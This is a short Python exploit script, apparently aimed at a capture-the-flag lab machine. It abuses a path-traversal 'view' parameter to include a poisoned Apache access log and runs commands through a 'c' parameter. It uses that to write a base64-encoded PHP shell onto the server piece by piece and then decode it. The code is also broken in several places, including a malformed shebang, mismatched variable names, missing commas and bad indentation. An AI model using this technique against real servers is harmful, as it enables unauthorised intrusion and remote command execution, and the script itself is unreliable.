#!/usr/bin/bash/env python

import requests 
import base64

url ="http://10.10.149.130/"

with open('shell.php')as handle:
	line = [ base64.b64encode(x.strip()) for x in handle.readline()]

for line in lines:
	params = {
		"view" : "dog/../../../../../../var/log/apache2/access.log",
		"exit" : ""
		"c" : "echo {} >> revshell.php".format(line)
		}

		 r= requests.get(url,params = params)

params = {
                "view" : "dog/../../../../../../var/log/apache2/access.log",
                "exit" : ""
                "c" : "base64 -d  revshell.php > shell.php"
            }

                 r= requests.get(url,params = params)
